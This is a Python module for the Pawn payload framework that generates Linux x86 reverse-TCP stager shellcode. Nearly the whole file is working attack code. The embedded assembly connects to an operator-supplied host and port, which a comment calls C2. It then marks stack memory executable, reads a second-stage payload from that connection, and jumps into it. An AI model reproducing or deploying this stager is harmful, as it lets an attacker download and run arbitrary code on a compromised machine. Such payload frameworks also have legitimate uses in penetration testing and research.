"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from typing import Optional
from textwrap import dedent

from pex.assembler import Assembler
from pex.socket import Socket

from pawn.lib.module import Module


class PawnModule(Module, Socket, Assembler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "linux/x86/reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Architecture': "x86",
            'Platform': "linux",
            'SendSize': False,
        }

    def run(self, host: str, port: int, length: int = 4096, reliable: bool = True) -> bytes:
        host = self.pack_host(host)
        port = self.pack_port(port)

        mprotect_flags = 0b111

        if length % 0x100 == mprotect_flags and length <= 0xff00 + mprotect_flags:
            length = length / 0x100
            reg = 'dh'
        elif length < 0x100:
            reg = 'dl'
        elif length < 0x10000:
            reg = 'dx'
        else:
            reg = 'edx'

        payload = dedent(f"""\
            start:
                /*
                 * Set up socket for further communication with C2
                 * socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
                 */

                xor ebx, ebx
                mul ebx
                push ebx
                inc ebx
                push ebx
                push 0x2
                mov al, 0x66
                mov ecx, esp
                int 0x80

                xchg edi, eax

                pop ebx
                push 0x{host.hex()}
                push 0x{port.hex()}0002
                mov ecx, esp

                push 0x66
                pop eax
                push eax
                push ecx
                push edi
                mov ecx, esp
                inc ebx
                int 0x80
        """)

        if reliable:
            payload += dedent("""\
                    test eax, eax
                    js fail
            """)

        payload += dedent(f"""\
                mov dl, {hex(mprotect_flags)}
                mov ecx, 0x1000
                mov ebx, esp
                shr ebx, 0xc
                shl ebx, 0xc
                mov al, 0x7d
                int 0x80
        """)

        if reliable:
            payload += dedent("""\
                    test eax, eax
                    js fail
            """)

        payload += dedent(f"""\
                pop ebx
                mov ecx, esp
                cdq
                mov {reg}, {hex(length)}
                mov al, 0x3
                int 0x80
        """)

        if reliable:
            payload += dedent("""\
                    test eax, eax
                    js fail
            """)

        payload += dedent("""\
                jmp ecx
        """)

        if reliable:
            payload += dedent("""\
                fail:
                    mov eax, 0x1
                    mov ebx, 0x0
                    int 0x80
            """)

        return self.assemble(
            self.details['Architecture'], payload)
